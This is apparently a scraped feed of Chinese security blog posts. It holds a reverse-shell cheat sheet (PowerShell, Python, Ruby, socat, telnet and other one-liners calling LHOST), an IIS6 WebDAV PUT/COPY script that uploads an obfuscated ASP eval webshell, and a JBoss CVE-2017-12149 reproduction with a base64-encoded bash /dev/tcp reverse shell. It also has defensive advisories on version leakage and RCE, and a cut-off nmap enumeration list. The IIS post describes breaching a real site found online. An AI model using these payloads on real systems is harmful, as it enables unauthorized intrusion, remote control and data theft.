title="Powershell"></a>Powershell</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="hljs-string">'LHOST'</span>,LPORT); <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream(); [byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;; <span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0) &#123;; <span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>); <span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String ); <span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">'PS '</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">'&gt; '</span>; <span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>); <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length); <span class="hljs-variable">$stream</span>.Flush()&#125;; <span class="hljs-variable">$client</span>.Close();<br></code></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p><strong>TCP</strong></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"</span><br></code></pre></td></tr></table></figure><p><strong>STCP</strong></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"</span><br></code></pre></td></tr></table></figure><p><strong>UDP</strong></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();"</span><br></code></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></code></pre></td></tr></table></figure><p><strong>Windows</strong></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></code></pre></td></tr></table></figure><h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT<br></code></pre></td></tr></table></figure><h2 id="TCLsh"><a href="#TCLsh" class="headerlink" title="TCLsh"></a>TCLsh</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'set s [socket LHOST LPORT];while 42 &#123; puts -nonewline $s "shell&gt;";flush $s;gets $s c;set e "exec $c";if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;'</span> | tclsh<br></code></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet LHOST LPORT 0/tmp/p<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT<br></code></pre></td></tr></table></figure><h2 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">xhost +RHOST<br>xterm -display LHOST:0 or DISPLAY=LHOST: xterm<br></code></pre></td></tr></table></figure><h2 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat file:`tty`,<span class="hljs-built_in">echo</span>=0,raw tcp-listen:LPORT<br>nc -lvvp LPORT<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 转载搬运 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft IIS WebDAV Write Access Code Execution</title>
      <link href="/posts/6b5b56c.html"/>
      <url>/posts/6b5b56c.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB18xKiaCSD3KVjSZFKq6z10VXaO.jpg"></p><a id="more"></a><p>某天，在网上逛了逛发现了个iis 6站，http所有方法都开了。古老的iis6，存在文件解析漏洞。So。。。。。</p><p>使用py脚本进行put一个shell的txt文件，然后copy成<code>.asp;txt</code>尾缀的新文件。</p><figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib2<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iisput</span><span class="hljs-params">()</span>:</span><br>url=<span class="hljs-string">"http://example.com/q.txt"</span><br>    <span class="hljs-comment"># passwd:z</span><br>data=<span class="hljs-string">'&lt;%Function MorfiCoder(Code)MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)End FunctionExecute MorfiCoder(")/*/z/*/(tseuqer lave")%&gt;'</span><br>req=urllib2.Request(url,data)<br>req.get_method=<span class="hljs-keyword">lambda</span>:<span class="hljs-string">'PUT'</span><br>req=urllib2.urlopen(req)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iiswrite</span><span class="hljs-params">()</span>:</span><br>url=<span class="hljs-string">"http://example.com/q.txt"</span><br>req=urllib2.Request(url)<br>req.get_method=<span class="hljs-keyword">lambda</span>:<span class="hljs-string">'COPY'</span><br>req.add_header(<span class="hljs-string">'Destination'</span>, <span class="hljs-string">'http://example.com/q.asp;txt'</span>)<br>req=urllib2.urlopen(req)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>iisput()<br><span class="hljs-keyword">print</span> <span class="hljs-string">"Txt file put successfully"</span><br>iiswrite()<br><span class="hljs-keyword">print</span> <span class="hljs-string">"Copy txt to asp successfully"</span><br></code></pre></td></tr></table></figure><p>菜刀连接，整站源码直接暴露出来了。</p><p><img src="https://ae01.alicdn.com/kf/HTB1Kp1jaBSD3KVjSZFq7634bpXay.png"></p><p>查看当前连接情况，发现已经沦落为跑马场了，所有没什么可玩的了。</p><p><img src="https://ae01.alicdn.com/kf/HTB1Uo9paqWs3KVjSZFx761WUXXay.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Middleware version information leaked</title>
      <link href="/posts/5be9406d.html"/>
      <url>/posts/5be9406d.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1kfGiaBGE3KVjSZFh763kaFXa4.png"></p><a id="more"></a><p><strong>原文：倾旋 <a href="https://payloads.online/archivers/2018-04-18/2" target="_blank" rel="noopener">https://payloads.online/archivers/2018-04-18/2</a></strong></p><h2 id="0x00-中间件版本信息泄露"><a href="#0x00-中间件版本信息泄露" class="headerlink" title="0x00 中间件版本信息泄露"></a>0x00 中间件版本信息泄露</h2><h3 id="什么是中间件版本信息泄露"><a href="#什么是中间件版本信息泄露" class="headerlink" title="什么是中间件版本信息泄露"></a>什么是中间件版本信息泄露</h3><p>通常在HTTP报文的响应头中存在的标志、版本号等信息均属于中间件的版本信息泄露。</p><h3 id="中间件版本信息泄露的特点"><a href="#中间件版本信息泄露的特点" class="headerlink" title="中间件版本信息泄露的特点"></a>中间件版本信息泄露的特点</h3><p>通常出现在默认安装好的Web中间件上，大部分管理员都不会修改这个标志。</p><h2 id="0x01-中间件版本信息泄露-风险等级"><a href="#0x01-中间件版本信息泄露-风险等级" class="headerlink" title="0x01 中间件版本信息泄露-风险等级"></a>0x01 中间件版本信息泄露-风险等级</h2><p>** <code>低</code> **</p><h2 id="0x02-中间件版本信息泄露-原理"><a href="#0x02-中间件版本信息泄露-原理" class="headerlink" title="0x02 中间件版本信息泄露-原理"></a>0x02 中间件版本信息泄露-原理</h2><p>由于各大Web服务中间件为了打造品牌效应而在HTTP响应头中添加了标志信息、版本号。</p><h2 id="0x03-中间件版本信息泄露-常见场景"><a href="#0x03-中间件版本信息泄露-常见场景" class="headerlink" title="0x03 中间件版本信息泄露-常见场景"></a>0x03 中间件版本信息泄露-常见场景</h2><ul><li>Tomcat</li><li>Nginx</li><li>Apache</li><li>IIs</li><li>…均有此类现象</li></ul><h2 id="0x04-测试方案"><a href="#0x04-测试方案" class="headerlink" title="0x04 测试方案"></a>0x04 测试方案</h2><p>使用CURL发送OPTIONS、GET、POST、HEAD等请求，查看响应头中的Server行。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -I -X GET http://192.168.33.133/mutillidae/<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1NxmnaBKw3KVjSZFO761rDVXa2.png"></p><h2 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>将以下配置加入 <code>conf/httpd.conf</code>：</p><figure class="hljs highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ServerTokens</span> <span class="hljs-string">Prod</span><br><span class="hljs-attr">ServerSignature</span> <span class="hljs-string">Off</span><br></code></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>修改php配置文件 <code>php.ini</code> 将 <code>expose_php On</code> 改为：<code>expose_php Off</code>。</p><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>移除Server</strong></p><p>借助IIS URL Rewrite Module，添加如下的重写规则。</p><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">rewrite</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">allowedServerVariables</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">add</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"REMOTE_ADDR"</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">allowedServerVariables</span>&gt;</span>            <br>        <span class="hljs-tag">&lt;<span class="hljs-name">outboundRules</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">rule</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"REMOVE_RESPONSE_SERVER"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">match</span> <span class="hljs-attr">serverVariable</span>=<span class="hljs-string">"RESPONSE_SERVER"</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">".*"</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"Rewrite"</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">rule</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">outboundRules</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rewrite</span>&gt;</span><br></code></pre></td></tr></table></figure><p>存放在 <code>C:\Windows\System32\inetsrv\config\applicationHost.config </code>中。</p><p><strong>移除X-AspNet-Version</strong></p><p>在 <code>web.config</code> 的 <code>&lt;httpRuntime&gt;</code> 中添加 <code>enableVersionHeader=&quot;false&quot;</code>。</p><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">httpRuntime</span> <span class="hljs-attr">enableVersionHeader</span>=<span class="hljs-string">"false"</span> /&gt;</span><br></code></pre></td></tr></table></figure><p><strong>移除X-AspNetMvc-Version</strong></p><p>在 <code>Application_Start()</code> 中添加如下代码:</p><figure class="hljs highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Application_Start</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <br>    MvcHandler.DisableMvcResponseHeader = <span class="hljs-literal">true</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>移除X-Powered-By</strong></p><p>在IIS Manager的HTTP Response Headers中移除X-Powered-By</p><p><img src="https://ae01.alicdn.com/kf/HTB15FyiaA9E3KVjSZFG76319XXaa.png"></p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>在 <code>conf/nginx.conf</code>加入</p><figure class="hljs highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">server_tokens</span> <span class="hljs-literal">off</span>;<br></code></pre></td></tr></table></figure><h3 id="Tomact"><a href="#Tomact" class="headerlink" title="Tomact"></a>Tomact</h3><p>到apache-tomcat安装目录下的lib子文件夹，找到catalina.jar这包，并进行解解压。</p><p>修改 <code>lib\catalina.zip\org\apache\catalina\util\ServerInfo.properties</code></p><figure class="hljs highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">server.info=X<br>server.number=<span class="hljs-number">5.5</span><br>server.built=Dec <span class="hljs-number">1</span> <span class="hljs-number">2015</span> <span class="hljs-number">22</span>:<span class="hljs-number">30</span>:<span class="hljs-number">46</span> UTC<br></code></pre></td></tr></table></figure><p><strong>Referrer:</strong> <a href="https://blog.csdn.net/A11085013/article/details/78864807" target="_blank" rel="noopener">https://blog.csdn.net/A11085013/article/details/78864807</a></p>]]></content>
      
      
      <categories>
          
          <category> 转载搬运 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程代码执行</title>
      <link href="/posts/3b22e763.html"/>
      <url>/posts/3b22e763.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1luqraqWs3KVjSZFxq6yWUXXaS.jpg"></p><a id="more"></a><p><strong>原文：倾旋 <a href="https://payloads.online/archivers/2018-03-22/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-03-22/1</a></strong></p><h2 id="0x00-远程代码执行-介绍"><a href="#0x00-远程代码执行-介绍" class="headerlink" title="0x00 远程代码执行-介绍"></a>0x00 远程代码执行-介绍</h2><h3 id="什么是远程代码执行"><a href="#什么是远程代码执行" class="headerlink" title="什么是远程代码执行"></a>什么是远程代码执行</h3><p>远程命令执行 英文名称：RCE (remote code execution) ，简称RCE漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><h3 id="远程代码执行的特点"><a href="#远程代码执行的特点" class="headerlink" title="远程代码执行的特点"></a>远程代码执行的特点</h3><p>远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。</p><h2 id="0x01-远程代码执行-风险等级"><a href="#0x01-远程代码执行-风险等级" class="headerlink" title="0x01 远程代码执行-风险等级"></a>0x01 远程代码执行-风险等级</h2><p>** <code>高</code> ** </p><h2 id="0x02-远程代码执行-原理"><a href="#0x02-远程代码执行-原理" class="headerlink" title="0x02 远程代码执行-原理"></a>0x02 远程代码执行-原理</h2><p>由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。</p><h2 id="0x03-远程代码执行-常见场景"><a href="#0x03-远程代码执行-常见场景" class="headerlink" title="0x03 远程代码执行-常见场景"></a>0x03 远程代码执行-常见场景</h2><h3 id="使用了危险函数的Web应用"><a href="#使用了危险函数的Web应用" class="headerlink" title="使用了危险函数的Web应用"></a>使用了危险函数的Web应用</h3><h3 id="低版本的Java语言Struts框架"><a href="#低版本的Java语言Struts框架" class="headerlink" title="低版本的Java语言Struts框架"></a>低版本的Java语言Struts框架</h3><h2 id="0x04-测试方案"><a href="#0x04-测试方案" class="headerlink" title="0x04 测试方案"></a>0x04 测试方案</h2><h3 id="PHP中常见场景-模板引擎代码执行"><a href="#PHP中常见场景-模板引擎代码执行" class="headerlink" title="PHP中常见场景-模板引擎代码执行"></a>PHP中常见场景-模板引擎代码执行</h3><p><strong>Smarty 简介</strong></p><blockquote><p>Smarty是一个PHP的模板引擎。更明确来说，它可以帮助开发者更好地 分离程序逻辑和页面显示。最好的例子，是当程序员和模板设计师是不同的两个角色的情况，而且 大部分时候都不是同一个人的情况。</p><p>CVE-ID : CVE-2017-1000480</p></blockquote><p><strong>产生原因：</strong> 由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行。</p><p><strong>测试Payload：</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1vFCjaA9E3KVjSZFG76319XXap.png" alt="0x01.png"></p><h3 id="Java-Struts2-S2-045"><a href="#Java-Struts2-S2-045" class="headerlink" title="Java Struts2(S2-045)"></a>Java Struts2(S2-045)</h3><p><strong>Struts 简介</strong></p><blockquote><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。</p><p>CVE-ID : CVE-2017-5638</p></blockquote><p><strong>产生原因：</strong>由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行。</p><p><strong>测试Payload：</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB18NChawmH3KVjSZKz7622OXXaW.png" alt="0x02.png"></p><h2 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h2><p>升级插件、框架新版本。</p>]]></content>
      
      
      <categories>
          
          <category> 转载搬运 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jboss反序列化漏洞(CVE-2017-12149)</title>
      <link href="/posts/1de3639b.html"/>
      <url>/posts/1de3639b.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1JnGgaEGF3KVjSZFoq6zmpFXae.jpg"></p><a id="more"></a><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下就将来自客户端的数据流进行反序列化，从而导致了漏洞。远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>克隆 <code>vulnhub</code> 的项目到本地，cd到对应的文件夹，启动docker，然后执行以下命令开始下载测试环境</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p>浏览器访问 <code>http://192.168.33.137:8080</code> 即可看到JBoss默认页面</p><p><img src="https://ae01.alicdn.com/kf/HTB1xZqnaBGw3KVjSZFD760WEpXa2.png"></p><p>漏洞存在 <code>/invoker/readonly/</code>请求中，此处服务器将用户提交的POST内容进行了Java反序列化</p><p><img src="https://ae01.alicdn.com/kf/HTB1azSgavWG3KVjSZPc762kbXXa0.png"></p><p>下载用于生成序列化数据的<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener" title="ysoserial">ysoserial</a>，使用bash反弹shell</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.33.137/6666 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法,需要进行编码，而且漏洞复现文档里所提到的编码工具已经找不到，那就只能手动拼凑一下了</p><p>模型： <code>bash -c {echo,base64编码后的shell命令} | {base64,-d} | {bash,-i}</code></p><p>先把shell命令base64编码:<br><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEzNy82NjY2IDA+JjEK</code></p><p>然后替换echo后面的</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEzNy82NjY2IDA+JjEK&#125; | &#123;base64,-d&#125; | &#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>ysoserial</code> 生成Payload：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections1 <span class="hljs-string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEzNy82NjY2IDA+JjEK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> &gt; poc.ser<br></code></pre></td></tr></table></figure><p>kali nc监听：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 6666<br></code></pre></td></tr></table></figure><p>向存在漏洞的请求地址发送poc：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.33.137:8080/invoker/<span class="hljs-built_in">readonly</span> --data-binary @poc.ser<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1pZV7Xkxz61VjSZFt761DSVXat.png"></p><p>成功反弹shell</p><p><img src="https://ae01.alicdn.com/kf/HTB168mmaBKw3KVjSZFO761rDVXax.png"></p><p><strong>参考：</strong></p><p><a href="https://www.cnblogs.com/ikari/p/8989821.html" target="_blank" rel="noopener">https://www.cnblogs.com/ikari/p/8989821.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> JBoss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小本本--备忘录</title>
      <link href="/posts/554d428f.html"/>
      <url>/posts/554d428f.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1NN5aav1H3KVjSZFHq6zKppXaI.jpg"></p><a id="more"></a><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><center>枚举</center></h2><h3 id="常规枚举"><a href="#常规枚举" class="headerlink" title="常规枚举"></a>常规枚举</h3><p>显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1<br></code></pre></td></tr></table></figure><p>显示详细信息，SYN扫描，版本信息和针对服务的脚本。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -v -sS -A -T4 192.168.1.1<br></code></pre></td></tr></table></figure><p>扫描易受攻击的SMB服务器的Nmap脚本</p><p>注意：unsafe = 1可能会导致中断</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]<br></code></pre></td></tr></table></figure><p>获取同网段其他主机</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bah">netdiscover -r 192.168.1.0&#x2F;24<br></code></pre></td></tr></table></figure><h3 id="FTP-21"><a href="#FTP-21" class="headerlink" title="FTP (21)"></a>FTP (21)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="SSH-22"><a href="#SSH-22" class="headerlink" title="SSH (22)"></a>SSH (22)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh [ip] 22<br></code></pre></td></tr></table></figure><h3 id="SMTP-25"><a href="#SMTP-25" class="headerlink" title="SMTP (25)"></a>SMTP (25)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1<br><br>nc -nvv [ip] 25<br><br>telnet [ip] 25<br></code></pre></td></tr></table></figure><h3 id="Web-80-443"><a href="#Web-80-443" class="headerlink" title="Web (80/443)"></a>Web (80/443)</h3><p>birbuster(GUI)</p><figure class="hljs 